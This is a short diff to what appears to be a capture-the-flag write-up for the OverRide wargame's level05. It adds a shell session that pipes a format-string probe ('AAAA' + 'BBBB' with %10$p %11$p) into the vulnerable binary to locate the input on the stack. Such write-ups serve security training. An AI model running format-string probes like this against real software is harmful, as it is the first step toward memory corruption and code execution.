@@ -85,8 +85,10 @@ python3 -c "print(65 ^ 32)"
 97
 ```
 
-
-
+```
+level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level05
+aaaabbbb 0x61616161 0x62626262
+```
 
 
 
